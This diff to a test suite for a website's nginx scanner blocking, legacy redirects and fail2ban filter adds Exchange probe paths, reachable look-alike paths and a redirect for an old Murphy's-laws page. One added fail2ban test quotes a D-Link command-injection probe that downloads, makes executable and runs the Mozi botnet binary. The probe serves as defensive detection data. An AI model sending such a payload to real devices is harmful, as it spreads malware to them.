@@ -35,6 +35,9 @@ describe('nginx scanner defense', () => {
   });
 
   it.each([
+    '/autodiscover/autodiscover.xml',
+    '/ews/exchange.asmx',
+    '/EWS/Services.asmx?x=1',
     '/.env',
     '/.env.production',
     '/.env-example',
@@ -479,6 +482,9 @@ describe('nginx scanner defense', () => {
     // Names next to the new scanner rules that must stay reachable, and queries that merely mention them
     '/ads.txt',
     '/app-ads.txt',
+    '/autodiscover',
+    '/browse?q=autodiscover/autodiscover.xml',
+    '/news/exchange.asmx',
     '/api/session',
     '/api/session/propertiesx',
     '/environment',
@@ -1134,6 +1140,7 @@ describe('nginx legacy URL redirects', () => {
     ['/terms-of-service.html', '/terms'],
     ['/old/index.htm', '/'],
     ['/index.htm', '/'],
+    ['/old/murphy/murphy-toddler.htm', '/category/murphys-toddlers-laws'],
     ['/murphy', '/'],
     // The same old page linked with a capital M (locations are case-sensitive)
     ['/Murphy/Murphy-true.html', '/origin-story'],
@@ -1394,6 +1401,7 @@ describe('fail2ban scanner filter', () => {
       ['a binary probe that starts with a semicolon', ';\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\xD4\\x07'],
       ['the WebLogic T3 handshake', 't3 12.1.2'],
       ['a bare method with no path', 'GET'],
+      ['a D-Link command injection with no method', '27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0'],
       ['another bare method', 'OPTIONS'],
       ['binary bytes beside a quote escape', '\\x22\\x16\\x03\\x01'],
     ])('counts %s', (_name, request) => {
@@ -1440,6 +1448,7 @@ describe('fail2ban scanner filter', () => {
       ['a lower-case bare method', 'get', 400, '"-"'],
       ['a lower-case connect', 'connect x HTTP/1.1', 400, '"-"'],
       ['PRI with a path', 'PRI / HTTP/1.1', 400, '"-"'],
+      ['a method and a path that mention wget', 'GET /x;wget%20y HTTP/1.1', 400, '"-"'],
       ['a URL path that contains CONNECT', 'GET /CONNECT HTTP/1.1', 400, '"-"'],
       ['a URL path that contains SSTP_', 'GET /SSTP_x HTTP/1.1', 400, '"-"'],
       ['a URL path that contains t3 and a digit', 'GET /t3 1 HTTP/1.1', 400, '"-"'],
